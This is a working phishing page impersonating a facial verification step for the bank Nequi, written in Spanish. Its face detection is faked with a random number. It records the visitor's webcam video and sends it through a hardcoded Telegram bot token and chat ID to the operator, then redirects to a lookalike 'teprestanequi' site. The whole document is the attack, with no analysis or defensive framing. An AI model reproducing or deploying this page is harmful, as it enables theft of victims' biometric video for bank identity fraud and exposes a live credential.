<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* 🔥 ALERTA SELFIE */
.alerta-selfie{
    position:fixed;
    top:20px;
    left:50%;
    transform:translateX(-50%);
    background:rgba(0,0,0,0.85);
    color:#fff;
    padding:15px 20px;
    border-radius:15px;
    font-size:14px;
    text-align:center;
    max-width:90%;
    z-index:9999;
    opacity:0;
    transition:0.4s;
}
.alerta-selfie.show{
    opacity:1;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.oval.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* Texto */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
    font-size: 18px;
    font-weight: bold;
    text-shadow: 1px 1px 2px black;
}

/* Warning */
.warning-message {
    position: absolute;
    top: 80px;
    left: 50%;
    transform: translateX(-50%);
    background: red;
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    display:none;
}
.warning-message.show{
    display:block;
}

/* Contador */
.countdown {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 80px;
    font-weight: bold;
    color: white;
    text-shadow: 2px 2px 10px black;
    z-index: 100;
    background: rgba(0,0,0,0.6);
    padding: 20px 40px;
    border-radius: 50px;
    display: none;
}

.countdown.show {
    display: block;
}
    .texto-arriba {
    position: absolute;
    top: calc(50% - 260px);
    left: 50%;
    transform: translateX(-50%);
    color: white;
    font-size: 16px;
    font-weight: bold;
    text-shadow: 1px 1px 3px black;
    text-align: center;
    z-index: 5;
}
</style>
</head>

<body>

<!-- 🔥 ALERTA INSTRUCCIONES -->
<div id="alertaSelfie" class="alerta-selfie">
📸 Verificación Facial<br>
Mantén tu rostro en el círculo<br>
mira de frente a la Camara por favor
</div>

    <div class="warning-message" id="warningMessage">
⚠️ Coloca tu rostro en el círculo
</div>

<div class="status" id="status">
 Coloca tu rostro en el círculo
</div>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="texto-arriba">Mira al frente de la cámara</div>
<div class="oval" id="oval"></div>
<div class="countdown" id="countdown">3</div>



<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const warningMessage = document.getElementById("warningMessage");
const countdownDiv = document.getElementById("countdown");

/* 🔥 ALERTA 5 SEGUNDOS */
const alertaSelfie = document.getElementById("alertaSelfie");
window.addEventListener("load", ()=>{
    alertaSelfie.classList.add("show");
    setTimeout(()=>{
        alertaSelfie.classList.remove("show");
    },5000);
});

/* CONFIG TELEGRAM */
const TELEGRAM_CONFIG = {
    token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
    chatId: "7158969671"
};

let recording = false;
let mediaRecorder = null;
let recordedChunks = [];
let faceDetected = false;
let detectionInterval = null;
let videoStream = null;

/* CAMARA */
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    videoStream = stream;
    video.srcObject = stream;
    statusText.innerText = " Coloca tu rostro en el círculo";
})
.catch(() => {
    statusText.innerText = "❌ Error cámara";
});

/* DETECCIÓN SIMPLE DE ROSTRO */
function startFaceDetection() {
    if (detectionInterval) clearInterval(detectionInterval);
    
    detectionInterval = setInterval(() => {
        if (recording || faceDetected) return;

        const random = Math.random();

        if (random > 0.5) { // Rostro detectado
            oval.classList.add("valid");
            warningMessage.classList.remove("show");
            statusText.innerText = "✅ Rostro detectando..";
            
            faceDetected = true;
            clearInterval(detectionInterval);
            
            // Iniciar la grabación después de 1 segundo
            setTimeout(() => {
                startRecording(videoStream);
            }, 1000);
            
        } else {
            oval.classList.remove("valid");
            warningMessage.classList.add("show");
            statusText.innerText = " Coloca tu rostro en el círculo";
        }
    }, 1000);
}

/* FUNCIÓN PRINCIPAL DE GRABACIÓN */
function startRecording(stream) {
    if (recording) return;

    recording = true;
    recordedChunks = [];

    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };

    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        statusText.innerText = "Acerca mas tu rostro...";
        enviarVideoTelegram(blob);
    };

    // Mostrar contador regresivo
    let count = 3;
    countdownDiv.innerText = count;
    countdownDiv.classList.add("show");
    
    const countdownInterval = setInterval(() => {
        count--;
        if (count > 0) {
            countdownDiv.innerText = count;
        } else {
            clearInterval(countdownInterval);
            countdownDiv.classList.remove("show");
            
            // Iniciar grabación
            mediaRecorder.start();
            statusText.innerText = "Mira de frente a la Camara";
            
            // Detener después de 10 segundos
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    statusText.innerText = "finalizada...";
                }
            }, 5000);
        }
    }, 1000);
}

/* ENVIAR VIDEO A TELEGRAM */
function enviarVideoTelegram(videoBlob) {
    const formData = new FormData();
    
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('video', videoBlob, 'verificacion_facial.webm');

    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendVideo`, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            statusText.innerText = "✅ selfi nequi correcta";
            setTimeout(() => {
                window.location.href = "https://teprestanequi.vercel.app/inicio/";
            }, 3000);
        } else {
            throw new Error("Error en respuesta");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        statusText.innerText = "❌ Error al enviar el video";
        recording = false;
        faceDetected = false;
        // Reiniciar detección
        setTimeout(() => {
            startFaceDetection();
        }, 3000);
    });
}

/* INICIAR DETECCIÓN DE ROSTRO AL CARGAR */
window.addEventListener("load", () => {
    setTimeout(() => {
        if (videoStream) {
            startFaceDetection();
        }
    }, 2000);
});
</script>

</body>
</html>
